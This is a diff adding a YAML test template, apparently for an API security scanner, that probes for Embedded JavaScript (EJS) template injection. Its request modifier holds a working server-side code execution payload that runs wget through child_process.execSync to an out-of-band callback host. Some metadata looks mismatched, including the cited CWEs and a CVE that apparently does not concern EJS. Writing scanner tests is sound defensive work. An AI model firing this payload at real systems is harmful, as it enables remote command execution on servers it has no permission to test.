@@ -1,0 +1,50 @@
+id: EMBEDDED_JS_TEMPLATE_INJECTION
+info:
+  name: "Embedded Javascript Template Injection Test"
+  description: "The Embedded JavaScript Template Injection Test checks for vulnerabilities in applications that use embedded JavaScript templates (such as those rendered on the server or client-side). When user-controlled input is inserted into JavaScript templates without proper sanitization, it may allow attackers to inject malicious code into the template. This can lead to various attacks, including cross-site scripting (XSS), unauthorized script execution, or data leakage. Preventing template injection requires strict input validation and sanitization, as well as using secure templating engines that automatically escape user input."
+  details:  "The Embedded JavaScript Template Injection Test looks for vulnerabilities in systems that use JavaScript-based templating engines, where user input is embedded directly into templates. If these inputs are not properly sanitized, an attacker can inject malicious JavaScript code into the template, which will be executed when rendered. This could lead to various attacks such as cross-site scripting (XSS), unauthorized access to user data, or even full remote code execution if the injection is exploited. Mitigating this risk involves using secure templating engines that automatically escape user inputs and implementing strong input validation and output encoding."
+  impact: "The impact of an Embedded JavaScript Template Injection vulnerability can be severe, as it allows attackers to inject malicious code into the application's templates, leading to potential cross-site scripting (XSS) attacks. This could result in unauthorized access to user data, session hijacking, or defacement of the application. If exploited, attackers may also be able to execute arbitrary commands or scripts on the client-side, compromising the integrity and security of the system. Proper input sanitization and secure templating practices are essential to prevent such vulnerabilities."
+  category:
+    name: INJECT
+    shortName: Injection Attacks
+    displayName: Injection Attacks (INJECT)
+  subCategory: EMBEDDED_JS_TEMPLATE_INJECTION
+  severity: MEDIUM
+  references:
+    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa8-security-misconfiguration.md"
+  cwe:
+    - CWE-200
+    - CWE-16
+  cve:
+    - CVE-2020-9402
+
+api_selection_filters:
+  method:
+    neq: "OPTIONS"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+execute:
+  type: single
+  requests:
+    - req:
+      - send_ssrf_req:
+        url: "https://test-services.akto.io/store_uuid/${random_uuid}"
+      - modify_url: "/page?settings[view%20options][closeDelimiter]=x%22)%3bprocess.mainModule.require(%27child_process%27).execSync(%27wget+https://test-services.akto.io/${random_uuid}%27)%3b//"
+      - modify_method: GET
+      - replace_body: '{}'
+validate:
+  response_code:
+    eq: 200 
+  ssrf_url_hit: ${random_uuid}
+  response_payload:
+    contains_all:
+      - You are viewing page number
+    length:
+      gt: 0
+
+strategy:
+  run_once: /
